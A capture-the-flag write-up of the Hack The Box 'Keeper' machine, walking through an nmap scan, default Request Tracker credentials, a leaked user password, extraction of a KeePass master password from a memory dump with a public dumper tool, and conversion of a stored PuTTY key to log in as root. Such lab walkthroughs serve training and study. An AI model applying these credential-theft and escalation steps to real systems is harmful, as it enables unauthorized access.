---
title: HTB-Keeper
date: 2024-01-22
categories: [HTB]
tags: [TAG]     # TAG names should always be lowercase
---
# HTB - Keeper

Add 10.10.11.227 to `/etc/hots`
### Nmap Scan

```bash

dflinton@kali:~/HTB/Machines/Keeper$ nmap -sV -sC -p- keeper.htb | tee nmap.txt                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 15:18 EST
Nmap scan report for keeper.htb (10.10.11.227)
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds


```

Domain Enumeration may be necessary here:


![](/assets/Images/htb-keeper/Pasted_image_20240122152118.png)

add `tickets.keeper.htb` to `/etc/hosts` as well

### Login Page

![](/assets/Images/htb-keeper/Pasted_image_20240122152342.png)

Login page is for RequestTracker 4.4.4

Default creds are root:password

### First set of creds:

lnorgaard:Welcome2023!

![](/assets/Images/htb-keeper/Pasted_image_20240122155130.png)

```bash
ssh lnorgaard@keeper.htb -p Welcome2023!

```
### User flag and beyond:

```bash
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ unzip RT30000.zip -d RT30000
Archive:  RT30000.zip
  inflating: RT30000/KeePassDumpFull.dmp  
 extracting: RT30000/passcodes.kdbx  
lnorgaard@keeper:~$ ls
RT30000  RT30000.zip  user.txt
lnorgaard@keeper:~$ cd RT30000/
lnorgaard@keeper:~/RT30000$ ls
KeePassDumpFull.dmp  passcodes.kdbx
lnorgaard@keeper:~/RT30000$ ls la
ls: cannot access 'la': No such file or directory
lnorgaard@keeper:~/RT30000$ ls -la
total 247476
drwxrwxr-x 2 lnorgaard lnorgaard      4096 Jan 22 22:12 .
drwxr-xr-x 6 lnorgaard lnorgaard      4096 Jan 22 22:12 ..
-rwxr-x--- 1 lnorgaard lnorgaard 253395188 May 24  2023 KeePassDumpFull.dmp
-rwxr-x--- 1 lnorgaard lnorgaard      3630 May 24  2023 passcodes.kdbx
lnorgaard@keeper:~/RT30000$ 


```

### Grab the KeePass files:

```bash

dflinton@kali:~/HTB/Machines/Keeper$ sftp lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
Connected to keeper.htb.
sftp> cd RT
RT30000.zip  RT30000/     
sftp> cd RT30000
sftp> get *
Fetching /home/lnorgaard/RT30000/KeePassDumpFull.dmp to KeePassDumpFull.dmp
KeePassDumpFull.dmp                                                                                      100%  242MB   3.7MB/s   01:05    
Fetching /home/lnorgaard/RT30000/passcodes.kdbx to passcodes.kdbx
passcodes.kdbx                                                                                           100% 3630   123.3KB/s   00:00    
sftp> exit

```

### Breaking in to KeePassX:

First copy the files to a Windows box and download the keePassX exploit

https://github.com/vdohney/keepass-password-dumper

![](/assets/Images/htb-keeper/Pasted_image_20240122171826.png)

Run the .net file against the dump

```cmd

PS C:\Users\dflinton\Documents\HTB\Machines\Keeper\keepass-password-dumper-main > dotnet run KeePassDumpFull.dmp
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●Ï
Found: ●,
Found: ●l
Found: ●`
Found: ●-
Found: ●'
Found: ●]
Found: ●§
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
...
Found: ●A

Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●I
Found: ●:
Found: ●=
Found: ●_
Found: ●c
Found: ●M

Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M,
3.:     d,
4.:     g,
5.:     r,
6.:     ø,
7.:     d,
8.:      ,
9.:     m,
10.:    e,
11.:    d,
12.:     ,
13.:    f,
14.:    l,
15.:    ø,
16.:    d,
17.:    e,
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

Remember the user was danish, so lets google that password output...

![](/assets/Images/htb-keeper/Pasted_image_20240122172124.png)

the actual password is `rødgrød med fløde`

### Load the 'passcodes.kdbx' into KeePassX:

![[Images/Pasted image 20240122172309.png]]

Worth noting, unhiding and using the password does not work, we're gonna need a PEM file.

### Extract the ppk:

![](/assets/Images/htb-keeper/Pasted_image_20240122172544.png)

Copy the notes to a file called keeper.ppk and use puttygen to convert to a pem:

```bash
puttygen keeper.ppk -O private-openssh -o keeper.pem
```

```bash
dflinton@kali:~/HTB/Machines/Keeper$ ssh -i keeper.pem root@keeper.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Mon Jan 22 19:33:45 2024 from 10.10.14.240
root@keeper:~# ls
root.txt  RT30000.zip  SQL

```